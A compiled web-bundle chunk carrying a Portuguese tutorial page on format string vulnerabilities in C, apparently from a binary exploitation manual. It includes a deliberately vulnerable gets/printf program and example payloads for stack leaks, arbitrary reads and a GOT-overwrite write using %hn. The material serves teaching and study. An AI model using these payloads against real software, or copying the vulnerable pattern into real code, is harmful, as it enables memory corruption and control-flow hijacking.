"use strict";(globalThis.webpackChunkmanual_pwning_docs=globalThis.webpackChunkmanual_pwning_docs||[]).push([[3220],{3187(e,r,n){n.r(r),n.d(r,{assets:()=>c,contentTitle:()=>a,default:()=>x,frontMatter:()=>d,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"pwning/format-strings","title":"Format Strings","description":"Em C, as fun\xe7\xf5es printf, fprintf ou qualquer outras parecidas recebem Format Specifiers e colocam vari\xe1veis nos lugares deles para imprimir ao usu\xe1rio.","source":"@site/docs/pwning/3-format-strings.md","sourceDirName":"pwning","slug":"/pwning/format-strings","permalink":"/manual-pwning/docs/pwning/format-strings","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":6,"frontMatter":{"title":"Format Strings","sidebar_position":6},"sidebar":"tutorialSidebar","previous":{"title":"Buffer Overflow - Shellcode","permalink":"/manual-pwning/docs/pwning/bof/2-3-bof-shellcode"},"next":{"title":"Array indexing","permalink":"/manual-pwning/docs/pwning/array-indexing"}}');var i=n(4848),o=n(8453);const d={title:"Format Strings",sidebar_position:6},a=void 0,c={},l=[{value:"Aplicando Format Strings",id:"aplicando-format-strings",level:2},{value:"Diferen\xe7a entre 32-bit e 64-bit",id:"diferen\xe7a-entre-32-bit-e-64-bit",level:2},{value:"x86 (32-bit)",id:"x86-32-bit",level:3},{value:"x64 (32-bit)",id:"x64-32-bit",level:3},{value:"Tipos de Format Strings",id:"tipos-de-format-strings",level:2},{value:"Exemplo de payload",id:"exemplo-de-payload",level:2}];function t(e){const r={code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,o.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsxs)(r.p,{children:["Em C, as fun\xe7\xf5es ",(0,i.jsx)(r.code,{children:"printf"}),", ",(0,i.jsx)(r.code,{children:"fprintf"})," ou qualquer outras parecidas recebem Format Specifiers e colocam vari\xe1veis nos lugares deles para imprimir ao usu\xe1rio."]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-C",children:'int value = 1205;\r\n\r\nprintf("%x %x %x", value, value, value);\r\n\r\n// Sa\xedda: 4b5 4b5 4b5\n'})}),"\n",(0,i.jsx)(r.p,{children:"Mas e se n\xe3o tivermos argumentos o suficiente para todos os format specifiers?"}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-C",children:'int value = 1205;\r\n\r\nprintf("%x %x %x", value);\r\n\r\n// Sa\xedda: 4b5 5659b000 565981b0\n'})}),"\n",(0,i.jsxs)(r.p,{children:["O ",(0,i.jsx)(r.code,{children:"printf"})," espera a mesma quantidade de par\xe2metros que Format Specifiers, e apenas puxa esses par\xe2metros da stack. Se n\xe3o h\xe1 par\xe2metros suficientes na stack, ",(0,i.jsx)(r.strong,{children:"a fun\xe7\xe3o vai pegar os pr\xf3ximos valores, vazando endere\xe7os da stack"}),"."]}),"\n",(0,i.jsx)(r.h2,{id:"aplicando-format-strings",children:"Aplicando Format Strings"}),"\n",(0,i.jsx)(r.p,{children:"Temos o seguinte programa em x86:"}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-C",children:"#include <stdio.h>\r\n\r\nint main(void) {\r\n    char buffer[30];\r\n    \r\n    gets(buffer);\r\n\r\n    printf(buffer);\r\n    return 0;\r\n}\n"})}),"\n",(0,i.jsxs)(r.p,{children:["Input: ",(0,i.jsx)(r.code,{children:"%x %x %x %x %x"}),"\r\nOutput: ",(0,i.jsx)(r.code,{children:"f7f74080 0 5657b1c0 782573fc 20782520"})]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{children:"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\r\n00:0000\u2502 esp 0xffffcf10 \u2014\u25b8 0xffffcf28 \u25c2\u2014 '%x %x %x %x %x'\r\n01:0004\u2502-0e4 0xffffcf14 \u2014\u25b8 0xf7d843ac \u25c2\u2014 0x74656e00\r\n02:0008\u2502-0e0 0xffffcf18 \u2014\u25b8 0x8048288 \u25c2\u2014 '__libc_start_main'\r\n03:000c\u2502-0dc 0xffffcf1c \u2014\u25b8 0x804918c (main+26) \u25c2\u2014 add ebx, 0x2e74\r\n04:0010\u2502-0d8 0xffffcf20 \u25c2\u2014 0x7b1ea71\r\n05:0014\u2502-0d4 0xffffcf24 \u25c2\u2014 0\r\n06:0018\u2502-0d0 0xffffcf28 \u25c2\u2014 '%x %x %x %x %x'\r\n07:001c\u2502-0cc 0xffffcf2c \u25c2\u2014 'x %x %x %x'\n"})}),"\n",(0,i.jsxs)(r.p,{children:["Veja que o que foi vazado foi o ",(0,i.jsx)(r.strong,{children:"primeiro endere\xe7o a partir de esp em diante"}),": ",(0,i.jsx)(r.code,{children:"esp+0x4"}),", ",(0,i.jsx)(r.code,{children:"esp+0x8"}),",..."]}),"\n",(0,i.jsx)(r.p,{children:"Fluxo do printf:"}),"\n",(0,i.jsxs)(r.ol,{children:["\n",(0,i.jsx)(r.li,{children:"printf espera par\xe2metros ap\xf3s o formato na Stack"}),"\n",(0,i.jsxs)(r.li,{children:["O primeiro par\xe2metro (",(0,i.jsx)(r.strong,{children:"format string"}),") est\xe1 no ",(0,i.jsx)(r.strong,{children:"topo da pilha"})," no momento da chamada"]}),"\n",(0,i.jsxs)(r.li,{children:["Os par\xe2metros seguintes (que deveriam ser os valores para %x) ",(0,i.jsx)(r.strong,{children:"estariam imediatamente ap\xf3s"})]}),"\n"]}),"\n",(0,i.jsxs)(r.p,{children:["Para chamar ",(0,i.jsx)(r.code,{children:"printf(buffer)"}),", o ",(0,i.jsx)(r.strong,{children:"compilador"})," precisa:"]}),"\n",(0,i.jsxs)(r.ol,{children:["\n",(0,i.jsx)(r.li,{children:"Empurrar os par\xe2metros na pilha"}),"\n",(0,i.jsx)(r.li,{children:"Chamar a fun\xe7\xe3o"}),"\n"]}),"\n",(0,i.jsxs)(r.p,{children:["Exemplo de preparo de chamada de ",(0,i.jsx)(r.code,{children:'printf("%d %d", a, b)'}),":"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{children:'; Supondo que buffer esteja em [ebp-30]\r\npush b  (34)        \u2190 terceiro par\xe2metro\r\npush a  (99)        \u2190 segundo par\xe2metro  \r\nlea eax, [ebp-30]    ; eax recebe endere\xe7o do buffer (que cont\xe9m "%x %x %x %x %x")\r\npush eax         \u2190 primeiro par\xe2metro\r\ncall printf          ; push return address (stack), jump printf (rip)\n'})}),"\n",(0,i.jsxs)(r.p,{children:["Ap\xf3s ",(0,i.jsx)(r.code,{children:"push a, push b, push eax"}),", teremos a stack desse jeito:"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{children:'(endere\xe7os altos)\r\n+------------------+\r\n| ret. add printf  |\r\n+------------------+\r\n| ebp salvo        | \u2190 EBP\r\n+------------------+\r\n| buffer[29]       | \\\r\n| ...              |  | buffer (vari\xe1vel local)\r\n| buffer[0]="%x"   | /\r\n+------------------+ \r\n| b                | \u2190 ESP+12 (onde 2\xba %d vai buscar)\r\n+------------------+ \r\n| a                | \u2190 ESP+8 (onde 1\xba %d vai buscar)\r\n+------------------+\r\n| 1 Par\xe2metro      | \u2190 ESP+4\r\n+------------------+\r\n| ponteiro p/ buffer| \u2190 ESP APONTA AQUI! (primeiro par\xe2metro do printf)\r\n+------------------+\r\n(endere\xe7os baixos)\n'})}),"\n",(0,i.jsxs)(r.p,{children:["Ap\xf3s dar ",(0,i.jsx)(r.code,{children:"call printf"}),", agora estamos no Stack Frame da fun\xe7\xe3o ",(0,i.jsx)(r.code,{children:"printf"}),":"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{children:'(endere\xe7os altos)\r\n+-------------------+ \r\n| ...               | \u2191\r\n+-------------------+ \r\n| end. retorno main | \r\n+-------------------+ \r\n| ebp salvo         | \u2190 EBP da main (antes do printf)\r\n+-------------------+ \r\n| buffer[29]        | \\\r\n| ...               |  | Format String \u2190 regi\xe3o local da main (antes do printf)\r\n| buffer[0]="%x"    | /\r\n+-------------------+\r\n| ???               | \u2190 EBP+16 (onde 2\xba %d vai buscar)\r\n+-------------------+\r\n| ???               | \u2190 EBP+12 (onde 1\xba %d vai buscar)\r\n+-------------------+ \r\n| ponteiro p/ buffer| \u2190 EBP+8 do printf (Format String, 1\xba Par\xe2metro do printf)\r\n+-------------------+ \r\n| ret. add printf   | \u2190 EBP+4 do printf\r\n+-------------------+ \r\n| ebp salvo (printf)| \u2190 EBP do printf\r\n+-------------------+ \r\n| vars locais printf| \r\n+-------------------+ \u2190 ESP dentro do printf\r\n(endere\xe7os baixos)\n'})}),"\n",(0,i.jsxs)(r.p,{children:["A vulnerabilidade de format string ",(0,i.jsx)(r.strong,{children:"pode vazar TODA a regi\xe3o da pilha"}),', n\xe3o importa se a vari\xe1vel tem "rela\xe7\xe3o" com o printf ou n\xe3o. Isso pois ela permite ver desde o ESP at\xe9 o EBP da ',(0,i.jsx)(r.code,{children:"main"})," (fun\xe7\xe3o que chamou ",(0,i.jsx)(r.code,{children:"printf"}),")."]}),"\n",(0,i.jsxs)(r.p,{children:["Se pensarmos como blocos, um ",(0,i.jsx)(r.code,{children:'printf("%x")'})," imprime o conte\xfado do primeiro bloco depois de ",(0,i.jsx)(r.strong,{children:"ESP"}),"."]}),"\n",(0,i.jsx)(r.h2,{id:"diferen\xe7a-entre-32-bit-e-64-bit",children:"Diferen\xe7a entre 32-bit e 64-bit"}),"\n",(0,i.jsx)(r.h3,{id:"x86-32-bit",children:"x86 (32-bit)"}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:["Argumentos s\xe3o passados na ",(0,i.jsx)(r.strong,{children:"stack"})]}),"\n",(0,i.jsxs)(r.li,{children:["printf vai buscar o valor para ",(0,i.jsx)(r.code,{children:"%x"})," do pr\xf3ximo endere\xe7o na stack"]}),"\n",(0,i.jsx)(r.li,{children:"Isso seria aproximadamente ESP+4 (considerando o endere\xe7o de retorno na stack)"}),"\n"]}),"\n",(0,i.jsx)(r.p,{children:"Antes de chamar printf:"}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{children:"ESP   \u2192 endere\xe7o de retorno\r\nESP+4 \u2192 possivelmente o primeiro argumento (se houvesse)\r\nESP+8 \u2192 segundo argumento, etc.\n"})}),"\n",(0,i.jsx)(r.p,{children:'Quando printf("%x") \xe9 chamado:'}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsx)(r.li,{children:"printf espera encontrar o valor para %x em ESP+4"}),"\n",(0,i.jsx)(r.li,{children:"Mas ESP+4 cont\xe9m o endere\xe7o de retorno ou lixo"}),"\n"]}),"\n",(0,i.jsx)(r.h3,{id:"x64-32-bit",children:"x64 (32-bit)"}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsx)(r.li,{children:"Os primeiros argumentos s\xe3o passados em registradores"}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"printf"})," vai primeiro olhar nos registradores que armazenam par\xe2metros (",(0,i.jsx)(r.code,{children:"RDI"}),", ",(0,i.jsx)(r.code,{children:"RSI"}),", ",(0,i.jsx)(r.code,{children:"RDX"}),", ",(0,i.jsx)(r.code,{children:"RCX"}),", ",(0,i.jsx)(r.code,{children:"R8"}),", ",(0,i.jsx)(r.code,{children:"R9"}),")"]}),"\n",(0,i.jsx)(r.li,{children:"S\xf3 depois busca na stack"}),"\n"]}),"\n",(0,i.jsx)(r.p,{children:"Lembrando a ordem de passagem de argumentos para registradores:"}),"\n",(0,i.jsxs)(r.ol,{children:["\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"RDI"})," (Endere\xe7o da Format String)"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"RSI"}),"  (Par\xe2metro 1)"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"RDX"})," (Par\xe2metro 2)"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"RCX"})," (...)"]}),"\n",(0,i.jsx)(r.li,{children:(0,i.jsx)(r.code,{children:"R8"})}),"\n",(0,i.jsx)(r.li,{children:(0,i.jsx)(r.code,{children:"R9"})}),"\n",(0,i.jsx)(r.li,{children:"Stack (RSP+8, RSP+16, ...)"}),"\n"]}),"\n",(0,i.jsxs)(r.p,{children:["Se usarmos ",(0,i.jsx)(r.code,{children:'printf("%x")'}),", veremos o que h\xe1 de conte\xfado no registrador ",(0,i.jsx)(r.code,{children:"RSI"}),", que pode ser lixo de mem\xf3ria ou valor usado anteriormente pela fun\xe7\xe3o que fez a ",(0,i.jsx)(r.code,{children:"call"}),"."]}),"\n",(0,i.jsxs)(r.p,{children:["Isso nem sempre \xe9 muito \xfatil. Mas se usarmos ",(0,i.jsx)(r.code,{children:'printf("%x %x %x %x %x %x %x")'}),", temos:"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{children:"%x 1 \u2192 RSI (2\xba registrador)\r\n%x 2 \u2192 RDX (3\xba registrador)  \r\n%x 3 \u2192 RCX (4\xba registrador)\r\n%x 4 \u2192 R8  (5\xba registrador)\r\n%x 5 \u2192 R9  (6\xba registrador)\r\n%x 6 \u2192 Stack (RSP+8)  \u2190 AQUI COME\xc7A A STACK!\r\n%x 7 \u2192 Stack (RSP+16)\n"})}),"\n",(0,i.jsx)(r.h2,{id:"tipos-de-format-strings",children:"Tipos de Format Strings"}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"%x"})," - Imprime conte\xfado do bloco de mem\xf3ria em hexadecimal. ",(0,i.jsx)(r.code,{children:"%p"})," faz a mesma coisa, mas coloca ",(0,i.jsx)(r.code,{children:"0x"})," na frente."]}),"\n"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-c",children:'printf("%x");        // Vaza 4 bytes da stack\r\nprintf("%08x");      // Vaza com padding (8 d\xedgitos)\n'})}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"%s"})," - Imprime string at\xe9 null byte. Ao receber um bloco da stack como par\xe2metro, tenta interpretar o conte\xfado do bloco como ponteiro, indo at\xe9 esse endere\xe7o e imprimindo o conte\xfado como string.","\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsx)(r.li,{children:"Se argumento for endere\xe7o v\xe1lido - L\xea at\xe9 null byte"}),"\n",(0,i.jsx)(r.li,{children:"Se for endere\xe7o inv\xe1lido - Segmentation fault"}),"\n",(0,i.jsx)(r.li,{children:"Se controlarmos o argumento, podemos ler a string de qualquer endere\xe7o (BOF - Vari\xe1vel)"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-c",children:'printf("%s", 0x404000);  // L\xea string do endere\xe7o 0x404000\r\nprintf("%s");            // Tenta ler endere\xe7o da stack como ponteiro\n'})}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"%n"})," - Escreve o n\xfamero de bytes impressos at\xe9 agora no endere\xe7o dado. N\xe3o imprime texto, mas escreve em um endere\xe7o de mem\xf3ria.","\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"%n"}),"- Escreve int (4 bytes)"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"%hn"})," - Escreve short (2 bytes)"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"%hhn"})," - Escreve char (1 byte)"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-C",children:'printf("%100x%n", 0, &var);  // Escreve 100 em &var \r\n// (voc\xea pode usar isso para escrever o valor que quiser no bloco de mem\xf3ria)\n'})}),"\n",(0,i.jsx)(r.h2,{id:"exemplo-de-payload",children:"Exemplo de payload"}),"\n",(0,i.jsx)(r.p,{children:"Exemplo 1:"}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{children:"# 1. Reconhecimento: Onde est\xe1 nosso input? (encontrar os AAAA = 0x41414141)\r\nAAAA.%x.%x.%x.%x.%x.%x\r\n\r\n# 2. Leak de endere\xe7os (bypass ASLR)\r\n%p.%p.%p.%p.%p.%p.%p\r\n\r\n# 3. Arbitrary Read: ler de 0x404000\r\n# (primeiro colocar 0x404000 no buffer)\r\n\\x00\\x40\\x40\\x00.%s\r\n\r\n# 4. Arbitrary Write: sobrescrever GOT entry\r\n# Escrever 0xdeadbeef em 0x404020\r\n# Usando %hn para write parcial\r\n\r\n\\x20\\x40\\x40\\x00\\x00\\x00\\x00\\x00   # addr_low (0x404020)\r\n\\x22\\x40\\x40\\x00\\x00\\x00\\x00\\x00   # addr_high (0x404022)\r\n%.48863x                           # Padding para 0xbeef\r\n%7$hn                              # Write para addr_low\r\n%.8126x                            # Padding para 0xdead  \r\n%8$hn                              # Write para addr_high\n"})}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:["Descobrimos que nosso input/buffer \xe9 armazenado no 7\xba argumento que o ",(0,i.jsx)(r.code,{children:"printf"})," d\xe1"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"%7$hn"}),': Acessa o 7\xba "argumento" (primeiro endere\xe7o: ',(0,i.jsx)(r.code,{children:"0x404020"}),")","\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:["Escreve o n\xfamero de bytes impressos at\xe9 agora (48879 = ",(0,i.jsx)(r.code,{children:"0xbeef"}),")"]}),"\n",(0,i.jsxs)(r.li,{children:["No endere\xe7o ",(0,i.jsx)(r.code,{children:"0x404020"})]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(r.li,{children:[(0,i.jsx)(r.code,{children:"%8$hn"}),': Acessa o 8\xba "argumento" (segundo endere\xe7o: 0x404022)',"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:["Escreve o total de bytes impressos (57005 = ",(0,i.jsx)(r.code,{children:"0xdead"}),")"]}),"\n",(0,i.jsxs)(r.li,{children:["No endere\xe7o ",(0,i.jsx)(r.code,{children:"0x404022"})]}),"\n"]}),"\n"]}),"\n"]})]})}function x(e={}){const{wrapper:r}={...(0,o.R)(),...e.components};return r?(0,i.jsx)(r,{...e,children:(0,i.jsx)(t,{...e})}):t(e)}},8453(e,r,n){n.d(r,{R:()=>d,x:()=>a});var s=n(6540);const i={},o=s.createContext(i);function d(e){const r=s.useContext(o);return s.useMemo(function(){return"function"==typeof e?e(r):{...r,...e}},[r,e])}function a(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:d(e.components),s.createElement(o.Provider,{value:r},e.children)}}}]);